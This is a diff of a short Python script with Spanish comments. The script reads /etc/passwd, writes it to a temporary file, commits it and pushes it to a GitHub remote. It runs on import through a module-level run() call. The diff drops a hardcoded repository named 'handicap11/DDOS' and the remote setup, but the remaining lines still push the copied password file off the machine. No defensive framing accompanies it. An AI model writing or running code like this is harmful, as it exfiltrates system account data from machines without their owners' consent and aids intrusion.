@@ -7,9 +7,6 @@ def run():
     # Mensaje de commit para el cambio
     mensaje_commit = 'Agregar /etc/passwd a GitHub'
 
-    # Nombre del repositorio en GitHub
-    repo_nombre = 'handicap11/DDOS'
-    
     # Nombre del archivo en el repositorio
     archivo_en_repo = 'passwd_backup.txt'
 
@@ -22,13 +19,11 @@ def run():
         temp_file.write(contenido)
 
     # Añade y sube el archivo al repositorio de GitHub
-    subprocess.run(['git', 'init'])  # Inicializa un nuevo repositorio git en el directorio actual
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
     subprocess.run(['git', 'commit', '-m', mensaje_commit])
-    subprocess.run(['git', 'remote', 'add', 'origin', f'https://github.com/{repo_nombre}.git'])
-    subprocess.run(['git', 'push', '-u', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
+    subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
 
-    print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
+    print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')
 
 # Llamamos a la función run()
 run()
